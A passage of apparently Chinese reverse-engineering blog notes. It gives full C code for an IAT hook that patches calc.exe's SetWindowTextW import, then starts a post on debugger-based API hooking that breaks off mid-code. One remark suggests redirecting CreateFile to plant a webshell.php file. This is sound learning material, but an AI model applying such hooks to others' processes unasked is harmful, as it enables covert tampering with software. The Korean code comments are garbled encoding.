pfnOrg °ªÀ» pfnNew °ªÀ¸·Î º¯°æ½ÃÅ´</span></span><br><span class="line">BOOL <span class="title function_">hook_iat</span><span class="params">(LPCSTR szDllName, PROC pfnOrg, PROC pfnNew)</span></span><br><span class="line">&#123;</span><br><span class="line">HMODULE hMod;</span><br><span class="line">LPCSTR szLibName;</span><br><span class="line">PIMAGE_IMPORT_DESCRIPTOR pImportDesc; </span><br><span class="line">PIMAGE_THUNK_DATA pThunk;</span><br><span class="line">DWORD dwOldProtect, dwRVA;</span><br><span class="line">PBYTE pAddr;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// hMod, pAddr = ImageBase of calc.exe</span></span><br><span class="line">    <span class="comment">//             = VA to MZ signature (IMAGE_DOS_HEADER)</span></span><br><span class="line">hMod = GetModuleHandle(<span class="literal">NULL</span>);</span><br><span class="line">pAddr = (PBYTE)hMod;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// pAddr = VA to PE signature (IMAGE_NT_HEADERS)</span></span><br><span class="line">pAddr += *((DWORD*)&amp;pAddr[<span class="number">0x3C</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// dwRVA = RVA to IMAGE_IMPORT_DESCRIPTOR Table</span></span><br><span class="line">dwRVA = *((DWORD*)&amp;pAddr[<span class="number">0x80</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// pImportDesc = VA to IMAGE_IMPORT_DESCRIPTOR Table</span></span><br><span class="line">pImportDesc = (PIMAGE_IMPORT_DESCRIPTOR)((DWORD)hMod+dwRVA);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>( ; pImportDesc-&gt;Name; pImportDesc++ )</span><br><span class="line">&#123;</span><br><span class="line">        <span class="comment">// szLibName = VA to IMAGE_IMPORT_DESCRIPTOR.Name</span></span><br><span class="line">szLibName = (LPCSTR)((DWORD)hMod + pImportDesc-&gt;Name);</span><br><span class="line"><span class="keyword">if</span>( !_stricmp(szLibName, szDllName) )</span><br><span class="line">&#123;</span><br><span class="line">            <span class="comment">// pThunk = IMAGE_IMPORT_DESCRIPTOR.FirstThunk</span></span><br><span class="line">            <span class="comment">//        = VA to IAT(Import Address Table)</span></span><br><span class="line">pThunk = (PIMAGE_THUNK_DATA)((DWORD)hMod + </span><br><span class="line">                                         pImportDesc-&gt;FirstThunk);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// pThunk-&gt;u1.Function = VA to API</span></span><br><span class="line"><span class="keyword">for</span>( ; pThunk-&gt;u1.Function; pThunk++ )</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>( pThunk-&gt;u1.Function == (DWORD)pfnOrg )</span><br><span class="line">&#123;</span><br><span class="line">                    <span class="comment">// ¸Þ¸ð¸® ¼Ó¼ºÀ» E/R/W ·Î º¯°æ</span></span><br><span class="line">VirtualProtect((LPVOID)&amp;pThunk-&gt;u1.Function, </span><br><span class="line">                                   <span class="number">4</span>, </span><br><span class="line">                                   PAGE_EXECUTE_READWRITE, </span><br><span class="line">                                   &amp;dwOldProtect);</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// IAT °ªÀ» º¯°æ</span></span><br><span class="line">                    pThunk-&gt;u1.Function = (DWORD)pfnNew;</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// ¸Þ¸ð¸® ¼Ó¼º º¹¿ø</span></span><br><span class="line">                    VirtualProtect((LPVOID)&amp;pThunk-&gt;u1.Function, </span><br><span class="line">                                   <span class="number">4</span>, </span><br><span class="line">                                   dwOldProtect, </span><br><span class="line">                                   &amp;dwOldProtect);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">BOOL WINAPI <span class="title function_">DllMain</span><span class="params">(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">switch</span>( fdwReason )</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> DLL_PROCESS_ATTACH : </span><br><span class="line">            <span class="comment">// original API ÁÖ¼Ò ÀúÀå</span></span><br><span class="line">           g_pOrgFunc = GetProcAddress(GetModuleHandle(<span class="string">L&quot;user32.dll&quot;</span>), </span><br><span class="line">                                        <span class="string">&quot;SetWindowTextW&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// # hook</span></span><br><span class="line">            <span class="comment">//   user32!SetWindowTextW() ¸¦ hookiat!MySetWindowText() ·Î ÈÄÅ·</span></span><br><span class="line">hook_iat(<span class="string">&quot;user32.dll&quot;</span>, g_pOrgFunc, (PROC)MySetWindowTextW);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> DLL_PROCESS_DETACH :</span><br><span class="line">            <span class="comment">// # unhook</span></span><br><span class="line">            <span class="comment">//   calc.exe ÀÇ IAT ¸¦ ¿ø·¡´ë·Î º¹¿ø</span></span><br><span class="line">            hook_iat(<span class="string">&quot;user32.dll&quot;</span>, (PROC)MySetWindowTextW, g_pOrgFunc);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="DllMain"><a href="#DllMain" class="headerlink" title="DllMain"></a>DllMain</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">BOOL WINAPI <span class="title function_">DllMain</span><span class="params">(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">switch</span>( fdwReason )</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> DLL_PROCESS_ATTACH : </span><br><span class="line">            <span class="comment">// original API ÁÖ¼Ò ÀúÀå</span></span><br><span class="line">           g_pOrgFunc = GetProcAddress(GetModuleHandle(<span class="string">L&quot;user32.dll&quot;</span>), </span><br><span class="line">                                        <span class="string">&quot;SetWindowTextW&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// # hook</span></span><br><span class="line">            <span class="comment">//   user32!SetWindowTextW() ¸¦ hookiat!MySetWindowText() ·Î ÈÄÅ·</span></span><br><span class="line">hook_iat(<span class="string">&quot;user32.dll&quot;</span>, g_pOrgFunc, (PROC)MySetWindowTextW);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> DLL_PROCESS_DETACH :</span><br><span class="line">            <span class="comment">// # unhook</span></span><br><span class="line">            <span class="comment">//   calc.exe ÀÇ IAT ¸¦ ¿ø·¡´ë·Î º¹¿ø</span></span><br><span class="line">            hook_iat(<span class="string">&quot;user32.dll&quot;</span>, (PROC)MySetWindowTextW, g_pOrgFunc);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>第7、8行，获取目标API的地址，存放在<code>g_pOrgFunc</code>中</p></li><li><p>调用<code>hook_iat(&quot;user32.dll&quot;, g_pOrgFunc, (PROC)MySetWindowTextW);</code>，根据下边的函数原型，可以看到传入的参数大致情况：</p><ul><li>第一个参数，目标API所在的DLL文件</li><li>第二个参数，目标API所在DLL中的地址</li><li>第三个参数，钩子函数地址。</li></ul></li></ul><h4 id="hook-iat"><a href="#hook-iat" class="headerlink" title="hook_iat"></a>hook_iat</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">hook_iat</span><span class="params">(LPCSTR szDllName, PROC pfnOrg, PROC pfnNew)</span></span><br><span class="line">&#123;</span><br><span class="line">HMODULE hMod;</span><br><span class="line">LPCSTR szLibName;</span><br><span class="line">PIMAGE_IMPORT_DESCRIPTOR pImportDesc; </span><br><span class="line">PIMAGE_THUNK_DATA pThunk;</span><br><span class="line">DWORD dwOldProtect, dwRVA;</span><br><span class="line">PBYTE pAddr;</span><br><span class="line"></span><br><span class="line">hMod = GetModuleHandle(<span class="literal">NULL</span>);</span><br><span class="line">pAddr = (PBYTE)hMod;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// pAddr = VA to PE signature (IMAGE_NT_HEADERS)</span></span><br><span class="line">pAddr += *((DWORD*)&amp;pAddr[<span class="number">0x3C</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// dwRVA = RVA to IMAGE_IMPORT_DESCRIPTOR Table</span></span><br><span class="line">dwRVA = *((DWORD*)&amp;pAddr[<span class="number">0x80</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// pImportDesc = VA to IMAGE_IMPORT_DESCRIPTOR Table</span></span><br><span class="line">pImportDesc = (PIMAGE_IMPORT_DESCRIPTOR)((DWORD)hMod+dwRVA);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>( ; pImportDesc-&gt;Name; pImportDesc++ )</span><br><span class="line">&#123;</span><br><span class="line">        <span class="comment">// szLibName = VA to IMAGE_IMPORT_DESCRIPTOR.Name</span></span><br><span class="line">szLibName = (LPCSTR)((DWORD)hMod + pImportDesc-&gt;Name);</span><br><span class="line"><span class="keyword">if</span>( !_stricmp(szLibName, szDllName) )</span><br><span class="line">&#123;</span><br><span class="line">            <span class="comment">// pThunk = IMAGE_IMPORT_DESCRIPTOR.FirstThunk</span></span><br><span class="line">            <span class="comment">//        = VA to IAT(Import Address Table)</span></span><br><span class="line">pThunk = (PIMAGE_THUNK_DATA)((DWORD)hMod + </span><br><span class="line">                                         pImportDesc-&gt;FirstThunk);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// pThunk-&gt;u1.Function = VA to API</span></span><br><span class="line"><span class="keyword">for</span>( ; pThunk-&gt;u1.Function; pThunk++ )</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>( pThunk-&gt;u1.Function == (DWORD)pfnOrg )</span><br><span class="line">&#123;</span><br><span class="line">                    <span class="comment">// ¸Þ¸ð¸® ¼Ó¼ºÀ» E/R/W ·Î º¯°æ</span></span><br><span class="line">VirtualProtect((LPVOID)&amp;pThunk-&gt;u1.Function, </span><br><span class="line">                                   <span class="number">4</span>, </span><br><span class="line">                                   PAGE_EXECUTE_READWRITE, </span><br><span class="line">                                   &amp;dwOldProtect);</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// IAT °ªÀ» º¯°æ</span></span><br><span class="line">                    pThunk-&gt;u1.Function = (DWORD)pfnNew;</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// ¸Þ¸ð¸® ¼Ó¼º º¹¿ø</span></span><br><span class="line">                    VirtualProtect((LPVOID)&amp;pThunk-&gt;u1.Function, </span><br><span class="line">                                   <span class="number">4</span>, </span><br><span class="line">                                   dwOldProtect, </span><br><span class="line">                                   &amp;dwOldProtect);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>第10行，获取本进程的句柄（因为<code>GetModuleHandle</code>的参数是NULL）句柄存放在<code>hMod</code>变量中</li><li>第11行，将<code>hMod</code>转为PBYTE类型付给<code>pAddr</code>，这使得pAddr指向文件的<code>A to MZ signature (IMAGE_DOS_HEADER)</code>后续应该是根据这里，查找<code>SetWindowsText </code>API的调用地址（文件IAT）</li><li>第14-20行，从PE文件开头定位到PE文件中导入表结构体<code>IMAGE_IMPORT_DESCRIPTOR</code></li><li>第22-57行，遍历结构体<code>IMAGE_IMPORT_DESCRIPTOR</code>，找到目标DLL–<code>user32.dll</code>对应的<code>IMAGE_IMPORT_DESCRIPTOR</code>结构体<ul><li>里层遍历<code>user32.dll</code>导入的函数，匹配目标API–<code>SetWindowsText</code> <code>pThunk-&gt;u1.Function == (DWORD)pfnOrg</code>ps：之所以能这样是由于user32.dll是系统级DLL，系统中所有进程共享一份，因此能够这样跨进程（Injectdll.exe -&gt; calc.exe）匹配。找到后实施Hook<ul><li><code>VirtualProtect</code>修改相应内存的保护权限，需要写入，执行权限。</li><li><code>pThunk-&gt;u1.Function = (DWORD)pfnNew</code> 覆盖IAT中目标API地址为钩子函数，这样当进程调用它以为是<code>SetWindowsText</code>时，其实调用的是<code>Hook Function</code></li><li>覆盖完IAT后，需要使用<code>VirtualProtect</code>恢复相应内存的旧权限，这是因为可能PE有相关字段对应着，不恢复可能PE装载器装载时可能出现错误</li></ul></li></ul></li></ul><h4 id="hook-function"><a href="#hook-function" class="headerlink" title="hook function"></a>hook function</h4><p>钩子函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">BOOL WINAPI <span class="title function_">MySetWindowTextW</span><span class="params">(HWND hWnd, LPWSTR lpString)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">wchar_t</span>* pNum = <span class="string">L&quot;一二三四五六七八九&quot;</span>;</span><br><span class="line">    <span class="type">wchar_t</span> temp[<span class="number">2</span>] = &#123;<span class="number">0</span>,&#125;;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>, nLen = <span class="number">0</span>, nIndex = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    nLen = wcslen(lpString);</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; nLen; i++)</span><br><span class="line">    &#123;</span><br><span class="line"><span class="comment">//参数替换，使得显示的阿拉伯数字字符为中文字符</span></span><br><span class="line">        <span class="keyword">if</span>( <span class="string">L&#x27;0&#x27;</span> &lt;= lpString[i] &amp;&amp; lpString[i] &lt;= <span class="string">L&#x27;9&#x27;</span> )</span><br><span class="line">        &#123;</span><br><span class="line">            temp[<span class="number">0</span>] = lpString[i];</span><br><span class="line">            nIndex = _wtoi(temp);</span><br><span class="line">            lpString[i] = pNum[nIndex];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// user32!SetWindowTextW() API</span></span><br><span class="line">    <span class="keyword">return</span> ((PFSETWINDOWTEXTW)g_pOrgFunc)(hWnd, lpString);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="回顾"><a href="#回顾" class="headerlink" title="回顾"></a>回顾</h3><ul><li>定位到PE文件中的<code>OptionalHeader.DataDirectory[1]</code>记录的第一个<code>IMAGE_IMPORT_DESCRIPTOR</code>结构体</li><li>遍历所有<code>IMAGE_IMPORT_DESCRIPTOR</code>中的name字段，判断是否是目标DLL</li><li>确定目标DLL后，获取目标函数相应在DLL中的位置</li><li>修改相应的内存权限，覆盖目标函数的的地址</li><li>下钩成功</li></ul><p>下钩成功后，程序正常调用被Hook的API时，实际调用的是我们覆写进去的钩子函数的地址，在钩子函数相应的参数修改，由于此时API的参数被修改了，放行程序即可完成一次完整的API Hook</p>]]></content>
      
      
      <categories>
          
          <category> -逆向 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 《逆向工程核心原理学习》 </tag>
            
            <tag> 逆向 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>逆核系列No.13--Debug Hook</title>
      <link href="/2022/05/08/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No-13-Hook%E4%B9%8BDebugHook/"/>
      <url>/2022/05/08/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No-13-Hook%E4%B9%8BDebugHook/</url>
      
        <content type="html"><![CDATA[<p>逆向分析中，<code>钩取Hoonking</code>是一种截取程序信息，更改程序执行流向、往程序添加新功能的技术。<code>钩取Hoonking</code>技术实施流程：</p><ul><li>使用反汇编器&#x2F;调试器把握程序结构与工作原理</li><li>开发需要“钩子”代码，用于修改Bug、改善程序功能</li><li>灵活操作可执行文件与进程内存，设置“钩子”代码</li></ul><p>这里贴一下书中相关的Hook技术图表</p><img src="/2022/05/08/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No-13-Hook%E4%B9%8BDebugHook/1.png" class=""><hr><p>下边演示的是技术图表中</p><img src="/2022/05/08/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No-13-Hook%E4%B9%8BDebugHook/2.png" class=""><h3 id="背景介绍"><a href="#背景介绍" class="headerlink" title="背景介绍"></a>背景介绍</h3><p>操作系统出于诸多的安全考量会禁止用户程序直接访问相关的系统资源。当用户需要使用这些资源时，必须向<code>系统内核Kernel</code>申请，申请的“窗口”就是<code>Win32 API</code>。为实际运行程序代码，需要加载许多系统库（DLL）。所有进程都会默认加载<code>kernel32.dll</code>库，<code>kernel32.dll</code>又会加载<code>ntdll.dll</code>库</p><img src="/2022/05/08/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No-13-Hook%E4%B9%8BDebugHook/3.png" class=""><p>上述示意图表明使用常规系统资源的API会经由<code>kernel32.dll</code>与<code>ntdll.dll</code>不断向下调用，最后通过<code>SYSENTER</code>命令进入内核模式。</p><p>至此，我们了解了系统从用户区域试图访问系统资源需要经过<code>WIN32 API</code>的调用，通过这个窗口进入内核区域，执行完相关资源的访问后会到用户区域（处于安全考量）。这里如果以notepad.exe使用到的API <code>CreateFile</code>为例，会是如下的示意图：</p><img src="/2022/05/08/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No-13-Hook%E4%B9%8BDebugHook/4.png" class=""><p>这是由于<code>notepad.CreateFIle</code>是系统级DLL文件<code>Kernel32.dll</code>提供给notepad.exe使用的，即<code>Kernel32.dll</code>提供了接口以供用户程序<code>notepad.exe</code>使用。因此，当<code>notepad.CreateFile</code>调用发生，透过接口向系统提出访问申请，再由<code>Kernel32</code>响应，若成功，则进入内核，访问相应的资源。</p><h3 id="API-Hooking"><a href="#API-Hooking" class="headerlink" title="API Hooking"></a>API Hooking</h3><p>通过API钩取技术可以实现对某些Win32 API调用过程的拦截，并获得相应的控制权限。事实上该技术是比较通用的，想要截取哪个函数就编写相应的Hook function即可。因此该技术使用极为广泛。</p><p>本节讨论的是使用该技术用于钩取Win32 API，达到的效果如下：</p><img src="/2022/05/08/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No-13-Hook%E4%B9%8BDebugHook/5.png" class=""><p>可以看到使用hook技术，原本<code>notepad.CreateFile</code>是直接交给Kernel32.CreateFIle处理的，现在需要经过<code>Hook.MyOwnCreateFile</code>。这里边可以做的事情挺多的，例如可能程序想创建一个名为<code>note.txt</code>的无害文件的，被<code>Hook.MyOwnCreateFile</code>处理后实际递交到<code>Kernel32.CreateFile</code>的请求时创建一个名为<code>webshell.php</code>的文件，作用可见一斑。</p><p>那么问题的关键来了，上述程序执行流程怎么做到的？技术细节如何？带着疑问，开始下文吧！</p><h3 id="调试器Hook"><a href="#调试器Hook" class="headerlink" title="调试器Hook"></a>调试器Hook</h3><p>在开始第一部分的相关内容之前，有必要了解一下<code>调试器的工作原理</code>：</p><ul><li>被调试进程经过注册后，每当被调试者触发<code>调试事件（Debug Event）</code>时，OS会暂停其运行并向调试器报告相应事件。</li><li>调试器对相应事件做出处理后，执行权交回被调试进程，被调试进程接着程序执行</li></ul><p>需要指出的是：</p><ol><li>若相应进程处于非调试状态，调试事件会<strong>优先在其自身内部的异常处理机制进行处理，自带的异常处理机制无法处理时则交由OS的异常处理机制进行处理</strong>，大多数交付OS异常处理会是程序终止</li><li>调试器对于不关心的<code>调试事件（Debug Event）</code>是不做处理的，直接交付OS处理。</li></ol><img src="/2022/05/08/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No-13-Hook%E4%B9%8BDebugHook/6.png" class=""><p><strong>与调试相关的调试事件为：EXCEPTION_DEBUG_EVENT 与调试相关的异常事件为：EXCEPTION_BREAKPOINT异常。</strong>具体调试事件&amp;异常事件查看相关文档</p><p>其中<code>EXCEPTION_BREAKPOINT断点异常</code>是比较常作为该技术触发的异常，断点对应的汇编指令为<code>INT 3</code>，IA-32指令为<code>0xCC</code>。当程序指令执行到<code>INT 3 EXCEPTION_BREAKPOINT断点异常</code>被触发，此时程序的执行控制权会给到调试器，这也是调试器钩取方式的原理 – 修改感兴趣的代码对应的指令字节码第一个字节为<code>0xCC</code>，执行完<code>Hook function</code>的内容后恢复修改的字节，转交程序执行控制权即可。</p><h4 id="预备知识"><a href="#预备知识" class="headerlink" title="预备知识"></a>预备知识</h4><p>开始相关内容之前，需要补一些预备知识</p><h5 id="DebugEvent调试事件"><a href="#DebugEvent调试事件" class="headerlink" title="DebugEvent调试事件"></a>DebugEvent调试事件</h5><p><code>DEBUG_EVENT</code>是一个结构体，相关描述<a href="https://docs.microsoft.com/en-us/windows/win32/api/minwinbase/ns-minwinbase-debug_event">参见文档</a>原型如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">DEBUG_EVENT</span> &#123;</span></span><br><span class="line">  DWORD dwDebugEventCode;</span><br><span class="line">  DWORD dwProcessId;</span><br><span class="line">  DWORD dwThreadId;</span><br><span class="line">  <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">    EXCEPTION_DEBUG_INFO      Exception;</span><br><span class="line">    CREATE_THREAD_DEBUG_INFO  CreateThread;</span><br><span class="line">    CREATE_PROCESS_DEBUG_INFO CreateProcessInfo;</span><br><span class="line">    EXIT_THREAD_DEBUG_INFO    ExitThread;</span><br><span class="line">    EXIT_PROCESS_DEBUG_INFO   ExitProcess;</span><br><span class="line">    LOAD_DLL_DEBUG_INFO       LoadDll;</span><br><span class="line">    UNLOAD_DLL_DEBUG_INFO     UnloadDll;</span><br><span class="line">    OUTPUT_DEBUG_STRING_INFO  DebugString;</span><br><span class="line">    RIP_INFO                  RipInfo;</span><br><span class="line">  &#125; u;</span><br><span class="line">&#125; DEBUG_EVENT, *LPDEBUG_EVENT;</span><br></pre></td></tr></table></figure><h5 id="DebugEvent编号"><a href="#DebugEvent编号" class="headerlink" title="DebugEvent编号"></a>DebugEvent编号</h5><table><thead><tr><th align="left">Value</th><th align="left">Meaning</th></tr></thead><tbody><tr><td align="left"><strong>CREATE_PROCESS_DEBUG_EVENT</strong>3</td><td align="left">Reports a create-process debugging event (includes both a process and its main thread). The value of <strong>u.CreateProcessInfo</strong> specifies a <a href="https://docs.microsoft.com/en-us/windows/desktop/api/minwinbase/ns-minwinbase-create_process_debug_info">CREATE_PROCESS_DEBUG_INFO</a> structure.</td></tr><tr><td align="left"><strong>CREATE_THREAD_DEBUG_EVENT</strong>2</td><td align="left">Reports a create-thread debugging event (does not include the main thread of a process, see <code>CREATE_PROCESS_DEBUG_EVENT</code>). The value of <strong>u.CreateThread</strong> specifies a <a href="https://docs.microsoft.com/en-us/windows/desktop/api/minwinbase/ns-minwinbase-create_thread_debug_info">CREATE_THREAD_DEBUG_INFO</a> structure.</td></tr><tr><td align="left"><strong>EXCEPTION_DEBUG_EVENT</strong>1</td><td align="left">Reports an exception debugging event. The value of <strong>u.Exception</strong> specifies an <a href="https://docs.microsoft.com/en-us/windows/desktop/api/minwinbase/ns-minwinbase-exception_debug_info">EXCEPTION_DEBUG_INFO</a>structure.</td></tr><tr><td align="left"><strong>EXIT_PROCESS_DEBUG_EVENT</strong>5</td><td align="left">Reports an exit-process debugging event. The value of <strong>u.ExitProcess</strong> specifies an <a href="https://docs.microsoft.com/en-us/windows/desktop/api/minwinbase/ns-minwinbase-exit_process_debug_info">EXIT_PROCESS_DEBUG_INFO</a>structure.</td></tr><tr><td align="left"><strong>EXIT_THREAD_DEBUG_EVENT</strong>4</td><td align="left">Reports an exit-thread debugging event. The value of <strong>u.ExitThread</strong> specifies an <a href="https://docs.microsoft.com/en-us/windows/desktop/api/minwinbase/ns-minwinbase-exit_thread_debug_info">EXIT_THREAD_DEBUG_INFO</a>structure.</td></tr><tr><td align="left"><strong>LOAD_DLL_DEBUG_EVENT</strong>6</td><td align="left">Reports a load-dynamic-link-library (DLL) debugging event. The value of <strong>u.LoadDll</strong> specifies a <a href="https://docs.microsoft.com/en-us/windows/desktop/api/minwinbase/ns-minwinbase-load_dll_debug_info">LOAD_DLL_DEBUG_INFO</a> structure.</td></tr><tr><td align="left"><strong>OUTPUT_DEBUG_STRING_EVENT</strong>8</td><td align="left">Reports an output-debugging-string debugging event. The value of <strong>u.DebugString</strong> specifies an <a href="https://docs.microsoft.com/en-us/windows/desktop/api/minwinbase/ns-minwinbase-output_debug_string_info">OUTPUT_DEBUG_STRING_INFO</a> structure.</td></tr><tr><td align="left"><strong>RIP_EVENT</strong>9</td><td align="left">Reports a RIP-debugging event (system debugging error). The value of <strong>u.RipInfo</strong> specifies a <a href="https://docs.microsoft.com/en-us/windows/desktop/api/minwinbase/ns-minwinbase-rip_info">RIP_INFO</a>structure.</td></tr><tr><td align="left"><strong>UNLOAD_DLL_DEBUG_EVENT</strong>7</td><td align="left">Reports an unload-DLL debugging event. The value of <strong>u.UnloadDll</strong> specifies an <a href="https://docs.microsoft.com/en-us/windows/desktop/api/minwinbase/ns-minwinbase-unload_dll_debug_info">UNLOAD_DLL_DEBUG_INFO</a>structure.</td></tr></tbody></table><p>后面遇到了详细说</p><h5 id="ReadProcessMemory"><a href="#ReadProcessMemory" class="headerlink" title="ReadProcessMemory"></a>ReadProcessMemory</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">ReadProcessMemory</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in]  HANDLE  hProcess,</span></span><br><span class="line"><span class="params">  [in]  LPCVOID lpBaseAddress,</span></span><br><span class="line"><span class="params">  [out] LPVOID  lpBuffer,</span></span><br><span class="line"><span class="params">  [in]  SIZE_T  nSize,</span></span><br><span class="line"><span class="params">  [out] SIZE_T  *lpNumberOfBytesRead</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><p>从API名称不难判断大致完成的功能：选取目标进程<code>hProcess</code>的偏移位置<code>lpBaseAddress</code>为起始<strong>读取</strong><code>nSize</code>的内容，存放的位置为<code>lpBuffer</code>。至于第五个参数<code>lpNumberOfBytesRead</code>则是用于写入内容到指定变量的地址，为NULL则该字段无效。</p><h5 id=""><a href="#" class="headerlink" title=""></a></h5><h5 id="WriteProcessMemory"><a href="#WriteProcessMemory" class="headerlink" title="WriteProcessMemory"></a>WriteProcessMemory</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span 